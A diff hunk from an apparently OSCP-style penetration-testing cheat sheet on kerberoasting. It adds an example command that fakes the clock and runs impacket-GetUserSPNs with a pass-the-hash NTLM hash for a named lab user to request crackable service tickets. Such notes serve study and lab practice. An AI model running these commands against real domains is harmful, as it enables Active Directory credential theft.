@@ -626,6 +626,8 @@ kerberoasting note):
 ```bash
 proxychains -q net time -S {{TARGET_IP}}                       # read the DC clock
 faketime 'YYYY-MM-DD HH:MM:SS' proxychains -q impacket-GetUserSPNs -request -dc-ip {{TARGET_IP}} <DOMAIN>/{{USERNAME}}
+# Example 
+faketime "$(ntpdate -q 10.10.182.140 | head -n 1 | cut -d ' ' -f 1,2)" impacket-GetUserSPNs -request -dc-ip 10.10.182.140 -hashes :e728ecbadfb02f51ce8eed753f3ff3fd oscp.exam/celia.almeda 
 ```
 
 **9 · Still stuck? Skip the pivot.** If you already own a box on the target's subnet (e.g. a
